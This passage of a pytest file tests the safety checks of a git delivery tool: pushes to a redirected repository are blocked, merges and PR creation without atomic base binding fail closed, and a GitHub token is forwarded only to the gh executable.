    data = json.loads(cp.stdout)
    assert data["decision"]["reason"] == "atomic_push_base_binding_unavailable"
    assert data["delivery_status"] is None
    assert data["run"]["run_id"] is None
    assert data["run"]["created_at"] is None


def test_mutation_blocks_remote_that_differs_from_expected_repository(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-expected-binding")
    globals_ = ns["execute_mutating_operation"].__globals__
    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
    monkeypatch.setitem(globals_, "github_repo_slug", lambda *_args: "attacker/redirected")
    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda *_args, **_kwargs: pytest.fail("lock must not be acquired"))
    args = argparse.Namespace(
        operation="push", mode="execute", repo=str(repo), expected_repository="owner/repo",
        plugin_root=None, state_dir=None, run_id="expected-binding", pr=None, commit_message=None,
        pr_title=None, pr_body="", push_remote="origin", push_branch=None, head=None, base="main",
        merge_method="squash", delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
    )
    result, rc = ns["execute_mutating_operation"](args, delivery_status)
    assert rc == 2
    assert result["decision"]["reason"] == "expected_repository_mismatch"


def test_mutation_blocks_expected_repository_change_after_lock(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-expected-binding-after-lock")
    globals_ = ns["execute_mutating_operation"].__globals__
    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
    seen = {"slug": 0}

    def changing_slug(*_args):
        seen["slug"] += 1
        return "owner/repo" if seen["slug"] == 1 else "attacker/redirected"

    monkeypatch.setitem(globals_, "github_repo_slug", changing_slug)
    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda *_args, **_kwargs: {"acquired": True, "token": "lock-token"})
    monkeypatch.setitem(globals_, "release_finalization_lock", lambda *_args, **_kwargs: {"released": True})
    monkeypatch.setitem(globals_, "run_delivery_status", lambda *_args, **_kwargs: (delivery_status, 0))
    monkeypatch.setitem(globals_, "run_safe", lambda *_args, **_kwargs: pytest.fail("mutation must not execute"))
    args = argparse.Namespace(
        operation="push", mode="execute", repo=str(repo), expected_repository="owner/repo",
        plugin_root=None, state_dir=None, run_id="expected-binding-after-lock", pr=None, commit_message=None,
        pr_title=None, pr_body="", push_remote="origin", push_branch=None, head=None, base="main",
        merge_method="squash", delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
    )
    result, rc = ns["execute_mutating_operation"](args, delivery_status)
    assert rc == 2
    assert result["decision"]["reason"] == "expected_repository_changed_after_lock"


def test_run_safe_only_forwards_github_credentials_to_gh(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    monkeypatch.setenv("GH_TOKEN", "credential-sentinel")
    gh = tmp_path / "gh"
    git = tmp_path / "git"
    for executable in (gh, git):
        executable.write_text("#!/bin/sh\nprintf '%s' \"${GH_TOKEN:-missing}\"\n")
        executable.chmod(0o700)

    globals_ = ns["run_safe"].__globals__
    monkeypatch.setitem(globals_, "TRUSTED_GH", gh)
    monkeypatch.setitem(globals_, "TRUSTED_GIT", git)
    monkeypatch.setitem(globals_, "TRUSTED_EXECUTABLE_DIGESTS", {
        "gh": hashlib.sha256(gh.read_bytes()).hexdigest(),
        "git": hashlib.sha256(git.read_bytes()).hexdigest(),
    })

    gh_effect = ns["run_safe"](["gh"], tmp_path)
    git_effect = ns["run_safe"](["git"], tmp_path)

    assert gh_effect["stdout_tail"] == "credential-sentinel"
    assert git_effect["stdout_tail"] == "missing"


def test_github_pr_snapshot_parses_full_json_larger_than_artifact_tail(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    payload = {
        "number": 7,
        "state": "open",
        "head": {"sha": "abc", "ref": "feature", "repo": {"full_name": "owner/repo"}},
        "base": {"sha": "def", "ref": "main", "repo": {"full_name": "owner/repo"}},
        "padding": "x" * 10_000,
    }
    full = json.dumps(payload)
    globals_ = ns["github_pr_snapshot"].__globals__
    monkeypatch.setitem(
        globals_,
        "run_safe",
        lambda *_args, **_kwargs: {"ok": True, "returncode": 0, "stdout": full, "stdout_tail": full[-4000:], "stderr_tail": ""},
    )

    snapshot, effect, error = ns["github_pr_snapshot"](tmp_path, "owner/repo", 7)

    assert error is None
    assert snapshot == payload
    assert "stdout" not in effect
    assert len(effect["stdout_tail"]) == 4000


def test_direct_merge_fails_closed_without_atomic_base_binding(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-merge-reconcile")
    plugin = fake_busdriver(tmp_path / "busdriver-merge-reconcile")
    globals_ = ns["execute_mutating_operation"].__globals__
    delivery_status = delivery_status_for_mutation(repo, "pr_clean_read_only", "pr_review_fresh")
    api_calls = {"count": 0}
    merge_called = {"value": False}

    def fake_run_safe(cmd, _repo, **_kwargs):
        if cmd[:2] == ["gh", "api"]:
            api_calls["count"] += 1
            state = {
                "number": 7,
                "state": "open",
                "merged_at": None,
                "merge_commit_sha": None,
                "head": {"sha": "a" * 40, "ref": "feature", "repo": {"full_name": "owner/repo"}},
                "base": {"ref": "main", "sha": "b" * 40, "repo": {"full_name": "owner/repo"}},
                "html_url": "https://github.com/owner/repo/pull/7",
            }
            return {"ok": True, "returncode": 0, "stdout_tail": json.dumps(state), "stderr_tail": ""}
        if cmd[:3] == ["gh", "pr", "merge"]:
            merge_called["value"] = True
            return {"ok": True, "returncode": 0, "stdout_tail": "", "stderr_tail": ""}
        raise AssertionError(cmd)

    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
    monkeypatch.setitem(globals_, "run_pr_grind_loop", lambda _repo, _args: (bound_safe_loop_payload(_repo), 0))
    monkeypatch.setitem(globals_, "pr_grind_loop_envelope_safe", lambda *_args, **_kwargs: True)
    monkeypatch.setitem(globals_, "github_repo_slug", lambda *_args: "owner/repo")
    monkeypatch.setitem(globals_, "git_mutation_config_safety", lambda _repo: (True, None))
    monkeypatch.setitem(globals_, "run_safe", fake_run_safe)
    args = argparse.Namespace(
        operation="merge", mode="execute", repo=str(repo), plugin_root=str(plugin), state_dir=None,
        run_id="run-merge-reconcile", pr=7, commit_message="title", pr_title="title", pr_body="body",
        push_remote="origin", push_branch=None, head=None, base="main", merge_method="squash",
        delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
    )

    result, rc = ns["execute_mutating_operation"](args, delivery_status)

    assert rc == 2
    assert result["ok"] is False
    assert result["decision"]["status"] == result["mutating_run"]["status"] == "blocked"
    assert result["decision"]["reason"] == "atomic_merge_base_binding_unavailable"
    assert merge_called["value"] is False
    assert api_calls["count"] == 1


@pytest.mark.parametrize(
    ("operation", "decision_status", "litmus_decision_status", "expected_status", "expected_reason", "expected_effect", "allowed_flag"),
    [
        ("commit", "draft_changes_need_busdriver_finalization", "commit_litmus_fresh", "committed", "committed", "git_commit", "commit_allowed"),
        ("push", "pr_review_fresh", "pr_review_fresh", "pushed", "pushed", "git_push", "push_allowed"),
    ],
)
def test_mutating_operation_success_paths_record_lock_release_authority_and_side_effects(
    monkeypatch,
    tmp_path: Path,
    operation: str,
    decision_status: str,
    litmus_decision_status: str,
    expected_status: str,
    expected_reason: str,
    expected_effect: str,
    allowed_flag: str | None,
):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / f"repo-{operation}")
    plugin = fake_busdriver(tmp_path / f"busdriver-{operation}")
    globals_ = ns["execute_mutating_operation"].__globals__
    delivery_status = delivery_status_for_mutation(repo, decision_status, litmus_decision_status)
    git_rev_parse_calls = {"count": 0}

    def fake_git_output(_repo, *args):
        if args[:2] == ("rev-parse", "HEAD"):
            if operation == "commit":
                git_rev_parse_calls["count"] += 1
                return 0, "before" if git_rev_parse_calls["count"] == 1 else "after", ""
            return 0, "after", ""
        if args[:1] == ("status",):
            return 0, "", ""
        return 0, "origin/main", ""

    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
    monkeypatch.setitem(globals_, "repo_blocking_dirty_entries", lambda _repo, _dirs: [])
    monkeypatch.setitem(globals_, "staged_changes_status", lambda _repo: (True, None))
    monkeypatch.setitem(globals_, "commit_blocking_dirty_entries", lambda _status, _args: [])
    monkeypatch.setitem(globals_, "commit_litmus_staged_diff_blocker", lambda _status, _repo, **_kwargs: None)
    monkeypatch.setitem(globals_, "commit_staged_index", lambda _repo, _message, _env_extra=None, **_kwargs: {"ok": True, "returncode": 0, "commit_verified": True, "after_head": "after"})
    monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
    monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
    monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
    monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
    monkeypatch.setitem(globals_, "normalized_pr_head_arg", lambda _repo, _head, _branch, _remote: (_head, None))
    monkeypatch.setitem(globals_, "github_repo_slug", lambda _repo, _remote: "owner/repo")
    monkeypatch.setitem(globals_, "pr_base_ref", lambda _repo, _base=None: "origin/main")
    monkeypatch.setitem(globals_, "remote_branch_name_from_ref", lambda _ref: "main")
    monkeypatch.setitem(globals_, "git_output", fake_git_output)

    if operation == "pre-pr-review":
        monkeypatch.setitem(
            globals_,
            "run_busdriver_pre_pr_review",
            lambda _repo, _args: ({"ok": True, "reason": "busdriver_pre_pr_review_marker_written", "side_effects": [{"name": "busdriver_write_pr_marker", "ok": True}]}, 0),
        )
    elif operation == "push":
        mock_isolated_push(monkeypatch, globals_, True)
        live_head_calls = {"count": 0}
        def fake_live_remote_branch_head(_repo, _branch, _remote):
            live_head_calls["count"] += 1
            if live_head_calls["count"] == 1:
                return None, "remote_branch_not_found"
            return "after", None
        monkeypatch.setitem(globals_, "live_remote_branch_head", fake_live_remote_branch_head)
        monkeypatch.setitem(globals_, "run_safe", lambda _cmd, _repo, **_kwargs: {"ok": True, "returncode": 0})
    elif operation == "pr-create":
        pr_query_calls = {"count": 0}
        def fake_pr_create_run_safe(cmd, _repo, **_kwargs):
            if cmd[:2] == ["gh", "api"]:
                pr_query_calls["count"] += 1
                if pr_query_calls["count"] == 1:
                    payload = []
                else:
                    payload = [{
                        "number": 7,
                        "state": "open",
                        "head": {"sha": "after", "ref": "feature", "repo": {"full_name": "owner/repo"}},
                        "base": {"sha": "origin/main", "ref": "main", "repo": {"full_name": "owner/repo"}},
                        "html_url": "https://github.com/owner/repo/pull/7",
                    }]
                return {"ok": True, "returncode": 0, "stdout_tail": json.dumps(payload), "stderr_tail": ""}
            return {"ok": True, "returncode": 0, "stdout_tail": "https://github.com/owner/repo/pull/7", "stderr_tail": ""}
        monkeypatch.setitem(globals_, "live_remote_branch_head", lambda _repo, _branch, _remote: ("after", None))
        monkeypatch.setitem(globals_, "run_safe", fake_pr_create_run_safe)
    elif operation == "merge":
        merge_query_calls = {"count": 0}
        def fake_merge_run_safe(cmd, _repo, **_kwargs):
            if cmd[:2] == ["gh", "api"]:
                merge_query_calls["count"] += 1
                merged = merge_query_calls["count"] > 1
                payload = {
                    "number": 7,
                    "state": "closed" if merged else "open",
                    "merged_at": "2026-07-10T00:00:00Z" if merged else None,
                    "merge_commit_sha": "merge-sha" if merged else None,
                    "head": {"sha": "abc123", "ref": "feature", "repo": {"full_name": "owner/repo"}},
                    "base": {"sha": "origin/main", "ref": "main", "repo": {"full_name": "owner/repo"}},
                    "html_url": "https://github.com/owner/repo/pull/7",
                }
                return {"ok": True, "returncode": 0, "stdout_tail": json.dumps(payload), "stderr_tail": ""}
            return {"ok": True, "returncode": 0, "stdout_tail": "", "stderr_tail": ""}
        monkeypatch.setitem(globals_, "run_pr_grind_loop", lambda _repo, _args: (bound_safe_loop_payload(_repo), 0))
        monkeypatch.setitem(globals_, "pr_grind_loop_envelope_safe", lambda _loop: True)
        monkeypatch.setitem(globals_, "run_safe", fake_merge_run_safe)

    args = argparse.Namespace(
        operation=operation,
        mode="execute",
        repo=str(repo),
        plugin_root=str(plugin),
        state_dir=None,
        run_id=f"run-{operation}",
        pr=7 if operation == "merge" else None,
        commit_message="title",
        pr_title="title",
        pr_body="body",
        push_remote="origin",
        push_branch=None,
        head="feature" if operation == "pr-create" else None,
        base="main",
        merge_method="squash",
        delete_branch=True,
        busdriver_state_dir_name=None,
        verifier_timeout=180,
    )

    result, rc = ns["execute_mutating_operation"](args, delivery_status)

    assert rc == 0
    assert result["ok"] is True
    assert result["decision"] == {"status": expected_status, "reason": expected_reason, **{key: False for key in BLOCKED_KEYS}}
    mutating_run = result["mutating_run"]
    assert mutating_run["schema"] == "hermes-busdriver-mutating-delivery-run/v0"
    assert mutating_run["status"] == expected_status
    assert mutating_run["reason"] == expected_reason
    assert mutating_run["repo_root"] == str(repo)
    assert mutating_run["lock_acquire"]["acquired"] is True
    assert mutating_run["lock_release"]["released"] is True
    assert mutating_run["authority"]["allowed"] is True
    assert mutating_run["authority"]["finalization_allowed"] is True
    assert mutating_run["authority"]["marker_write_allowed"] is False
    if allowed_flag:
        assert mutating_run["authority"][allowed_flag] is True
    assert [step["status"] for step in result["steps"]] == ["passed", "passed", "passed"]
    effect_names = [effect["name"] for effect in mutating_run["side_effects"]]
    assert effect_names[0] == "delivery_status_after_lock"
    assert expected_effect in effect_names


def test_delivery_status_failure_prevents_verifier_execution(tmp_path: Path):
    missing_repo = tmp_path / "missing"
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"
    marker = tmp_path / "verifier-ran"

    cp, data = invoke(
        missing_repo,
        plugin,
        "--mode",
        "execute",
        "--operation",
        "verify",
        "--verifier",
        f"trip=printf ran > {shlex.quote(str(marker))}",
        artifact_dir=artifact_dir,
    )

    assert cp.returncode != 0
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "delivery_status_failed"
    assert data["verifiers"] == []
    assert not marker.exists()
    assert Path(data["run_artifact_path"]).exists()
    assert_finalization_blocked(data["decision"])


def test_pr_create_fails_closed_before_any_network_mutation(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-pr-create-blocked")
    assert run(["git", "remote", "add", "origin", "https://github.com/owner/repo.git"], repo).returncode == 0
    status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
    called = {"network": False}
    globals_ = ns["execute_mutating_operation"].__globals__
    original_run_safe = globals_["run_safe"]
    def guarded_run_safe(cmd, *args, **kwargs):
        if cmd and cmd[0] == "gh":
            called["network"] = True
            pytest.fail("GitHub network mutation must not execute")
        return original_run_safe(cmd, *args, **kwargs)
    globals_["run_safe"] = guarded_run_safe
    globals_["acquire_finalization_lock"] = lambda *_a, **_k: {"acquired": True, "token": "test-lock"}
    globals_["release_finalization_lock"] = lambda *_a, **_k: {"released": True}
    globals_["run_delivery_status"] = lambda *_a, **_k: (status, 0)
    args = argparse.Namespace(operation="pr-create", mode="execute", repo=str(repo), expected_repository="owner/repo", plugin_root=None, state_dir=None, run_id=None, pr=None, commit_message=None, pr_title="title", pr_body="body", push_remote="origin", push_branch=None, head=None, base=None, busdriver_state_dir_name=None)
    result, rc = ns["execute_mutating_operation"](args, status)
    assert rc == 2
    assert result["decision"]["reason"] == "atomic_pr_create_binding_unavailable"
    assert called["network"] is False
